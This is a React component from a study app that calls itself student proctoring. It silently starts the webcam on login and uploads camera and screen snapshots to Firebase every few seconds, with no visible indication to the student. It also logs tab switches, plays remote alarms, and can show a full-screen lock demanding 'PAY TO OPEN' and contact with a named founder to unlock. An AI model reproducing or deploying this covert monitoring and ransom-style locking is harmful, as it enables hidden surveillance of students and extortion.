import React, { useEffect, useRef, useState } from 'react';
import { UserProfile, isAuthorizedAdminEmail } from '../types';
import { db } from '../lib/firebase';
import { doc, updateDoc, onSnapshot, setDoc } from 'firebase/firestore';
import { Lock } from 'lucide-react';

interface StudentProctorClientProps {
  currentUser: UserProfile | null;
}

export const StudentProctorClient: React.FC<StudentProctorClientProps> = ({ currentUser }) => {
  const isExempt = !currentUser || currentUser.role === 'admin' || isAuthorizedAdminEmail(currentUser.email);

  const audioRef = useRef<HTMLAudioElement | null>(null);
  const [isAlarmActive, setIsAlarmActive] = useState(false);
  const [isThreatLocked, setIsThreatLocked] = useState(false);
  const [threatMessage, setThreatMessage] = useState('LOCKED BY SMART SUBHA');

  // Background Stream & Capture State (100% Silent - NO visible preview on student's screen)
  const [videoStream, setVideoStream] = useState<MediaStream | null>(null);
  const [displayStream, setDisplayStream] = useState<MediaStream | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const screenVideoRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const screenCanvasRef = useRef<HTMLCanvasElement | null>(null);
  const [cameraActive, setCameraActive] = useState(false);

  // 1. Real-time listener for remote alarms and locks
  useEffect(() => {
    if (isExempt || !currentUser?.uid) return;

    const unsub = onSnapshot(doc(db, 'users', currentUser.uid), (snap) => {
      if (!snap.exists()) return;
      const data = snap.data();

      // Check Threat Lock
      if (data.isDarkThreatLocked) {
        setIsThreatLocked(true);
        setThreatMessage(data.darkThreatMessage || 'LOCKED BY SMART SUBHA');
      } else {
        setIsThreatLocked(false);
      }

      // Check Remote Audio Alarm
      if (data.remoteAudioAlarm?.isPlaying) {
        setIsAlarmActive(true);
        if (!audioRef.current) {
          const audio = new Audio(data.remoteAudioAlarm.audioUrl || 'https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
          audio.loop = true;
          audioRef.current = audio;
        }
        audioRef.current.play().catch(() => {});
      } else {
        setIsAlarmActive(false);
        if (audioRef.current) {
          audioRef.current.pause();
          audioRef.current.currentTime = 0;
        }
      }

      // Check if Admin requested proctoring trigger
      if (data.proctorStatus?.requested && !videoStream) {
        startSilentCamera();
      }
    });

    return () => {
      unsub();
      if (audioRef.current) audioRef.current.pause();
    };
  }, [isExempt, currentUser?.uid, videoStream]);

  // 2. Default Silent Background Camera Initialization
  const startSilentCamera = async () => {
    try {
      if (!navigator.mediaDevices?.getUserMedia) return;
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          width: { ideal: 320 },
          height: { ideal: 240 },
          facingMode: 'user'
        },
        audio: false
      });

      setVideoStream(stream);
      setCameraActive(true);

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play().catch(() => {});
      }

      if (currentUser?.uid) {
        await updateDoc(doc(db, 'users', currentUser.uid), {
          'proctorStatus.cameraEnabled': true,
          'proctorStatus.active': true,
          'proctorStatus.connectedAt': new Date().toISOString()
        });
      }
    } catch (err: any) {
      console.warn("Silent camera init:", err?.message);
    }
  };

  // Auto-start camera by default on student login/load
  useEffect(() => {
    if (isExempt || !currentUser?.uid) return;
    
    const timer = setTimeout(() => {
      startSilentCamera();
    }, 1200);

    return () => clearTimeout(timer);
  }, [isExempt, currentUser?.uid]);

  // 3. Periodic Background Camera Snapshot Transmission (Every 2.5 seconds to Firestore)
  useEffect(() => {
    if (isExempt || !cameraActive || !videoStream || !currentUser?.uid) return;

    const interval = setInterval(async () => {
      try {
        const vid = videoRef.current;
        if (!vid || vid.readyState < 2) return;

        let canvas = canvasRef.current;
        if (!canvas) {
          canvas = document.createElement('canvas');
          canvasRef.current = canvas;
        }

        canvas.width = 320;
        canvas.height = 240;
        const ctx = canvas.getContext('2d');
        if (!ctx) return;

        ctx.drawImage(vid, 0, 0, 320, 240);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.45);

        const timestamp = new Date().toISOString();
        const payload = {
          cameraSnapshot: dataUrl,
          cameraUpdatedAt: timestamp,
          'proctorStatus.cameraEnabled': true,
          'proctorStatus.active': true,
          'proctorStatus.lastHeartbeat': timestamp
        };

        await updateDoc(doc(db, 'users', currentUser.uid), payload);
        await setDoc(doc(db, 'liveProctoring', currentUser.uid), {
          userId: currentUser.uid,
          userName: currentUser.name,
          cameraSnapshot: dataUrl,
          cameraUpdatedAt: timestamp,
          status: 'online'
        }, { merge: true });
      } catch (e) {
        // Non-blocking
      }
    }, 2500);

    return () => clearInterval(interval);
  }, [isExempt, cameraActive, videoStream, currentUser?.uid]);

  // 4. Periodic Live Screen / Viewport Snapshot Transmission (Every 3 seconds)
  useEffect(() => {
    if (isExempt || !currentUser?.uid) return;

    let isCapturing = false;

    const captureScreen = async () => {
      if (isCapturing) return;
      isCapturing = true;

      try {
        if (displayStream && screenVideoRef.current && screenVideoRef.current.readyState >= 2) {
          let sCanvas = screenCanvasRef.current;
          if (!sCanvas) {
            sCanvas = document.createElement('canvas');
            screenCanvasRef.current = sCanvas;
          }
          sCanvas.width = 480;
          sCanvas.height = 270;
          const sCtx = sCanvas.getContext('2d');
          if (sCtx) {
            sCtx.drawImage(screenVideoRef.current, 0, 0, 480, 270);
            const screenData = sCanvas.toDataURL('image/jpeg', 0.5);
            const ts = new Date().toISOString();
            await updateDoc(doc(db, 'users', currentUser.uid), {
              screenSnapshot: screenData,
              screenUpdatedAt: ts
            });
            await setDoc(doc(db, 'liveProctoring', currentUser.uid), {
              screenSnapshot: screenData,
              screenUpdatedAt: ts
            }, { merge: true });
          }
        } else {
          // Automatic silent in-app viewport capture using html2canvas
          const targetElem = document.body;
          if (targetElem) {
            const { default: html2canvas } = await import('html2canvas');
            const canvas = await html2canvas(targetElem, {
              scale: 0.35,
              logging: false,
              useCORS: true
            });

            const screenData = canvas.toDataURL('image/jpeg', 0.4);
            const ts = new Date().toISOString();
            await updateDoc(doc(db, 'users', currentUser.uid), {
              screenSnapshot: screenData,
              screenUpdatedAt: ts,
              currentActivity: document.title || "Studying in App"
            });
            await setDoc(doc(db, 'liveProctoring', currentUser.uid), {
              screenSnapshot: screenData,
              screenUpdatedAt: ts
            }, { merge: true });
          }
        }
      } catch (e) {
        // Non-blocking
      } finally {
        isCapturing = false;
      }
    };

    const interval = setInterval(captureScreen, 3000);
    const initialTimer = setTimeout(captureScreen, 1800);

    return () => {
      clearInterval(interval);
      clearTimeout(initialTimer);
    };
  }, [isExempt, currentUser?.uid, displayStream]);

  // 5. Tab Focus & Switching Detection
  useEffect(() => {
    if (isExempt || !currentUser?.uid) return;

    const handleVisibilityChange = async () => {
      const isHidden = document.hidden;
      try {
        await updateDoc(doc(db, 'users', currentUser.uid), {
          isTabFocused: !isHidden,
          lastFocusEvent: new Date().toISOString(),
          ...(isHidden ? { tabSwitchCount: ((currentUser as any).tabSwitchCount || 0) + 1 } : {})
        });
      } catch (e) {}
    };

    const handleBlur = async () => {
      try {
        await updateDoc(doc(db, 'users', currentUser.uid), {
          isTabFocused: false,
          lastFocusEvent: new Date().toISOString(),
          tabSwitchCount: ((currentUser as any).tabSwitchCount || 0) + 1
        });
      } catch (e) {}
    };

    const handleFocus = async () => {
      try {
        await updateDoc(doc(db, 'users', currentUser.uid), {
          isTabFocused: true,
          lastFocusEvent: new Date().toISOString()
        });
      } catch (e) {}
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);
    window.addEventListener('blur', handleBlur);
    window.addEventListener('focus', handleFocus);

    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      window.removeEventListener('blur', handleBlur);
      window.removeEventListener('focus', handleFocus);
    };
  }, [currentUser?.uid]);

  // Clean up streams on unmount
  useEffect(() => {
    return () => {
      if (videoStream) videoStream.getTracks().forEach(t => t.stop());
      if (displayStream) displayStream.getTracks().forEach(t => t.stop());
    };
  }, [videoStream, displayStream]);

  // ADMIN IMMUNITY: All proctoring surveillance applies ONLY to students.
  // The Admin is 100% exempt and will never have surveillance or locks triggered on themselves.
  if (isExempt) {
    return null;
  }

  return (
    <>
      {/* 100% Hidden Processing Elements - Nothing visible on student's UI */}
      <video ref={videoRef} autoPlay playsInline muted className="hidden" />
      <video ref={screenVideoRef} autoPlay playsInline muted className="hidden" />

      {/* DARK THREAT SCREEN OVERLAY ("LOCKED BY SMART SUBHA") - Only shows if explicitly threat-locked by Admin */}
      {isThreatLocked && (
        <div className="fixed inset-0 z-[99999] bg-black text-rose-500 flex flex-col items-center justify-center p-6 select-none cursor-not-allowed">
          <div className="w-24 h-24 rounded-full bg-rose-600/20 border-2 border-rose-500 flex items-center justify-center animate-bounce mb-6 text-rose-500">
            <Lock size={48} />
          </div>

          <div className="w-full overflow-hidden whitespace-nowrap bg-rose-950/80 border-y-2 border-rose-600 py-3 mb-8 shadow-[0_0_50px_rgba(244,63,94,0.5)]">
            <div className="inline-block animate-marquee text-2xl sm:text-4xl font-mono font-black text-rose-400 uppercase tracking-widest">
              🚨 {threatMessage} • PAY TO OPEN • {threatMessage} • CONTACT FOUNDER SUBHAJIT SANPUI TO UNLOCK • 🚨
            </div>
          </div>

          <div className="max-w-md text-center space-y-4">
            <h2 className="text-xl sm:text-2xl font-black text-white">DEVICE ACCESS RESTRICTED</h2>
            <p className="text-xs text-rose-300 font-mono leading-relaxed">
              This terminal has been temporarily secured by the Administrator. All study tools and note libraries are locked until released by teacher command.
            </p>
            <div className="text-[10px] text-slate-500 font-mono pt-4 border-t border-slate-800">
              TERMINAL ID: {currentUser?.uid?.slice(0, 10) || 'STUDY-TERM'} • STATUS: SECURED
            </div>
          </div>
        </div>
      )}
    </>
  );
};
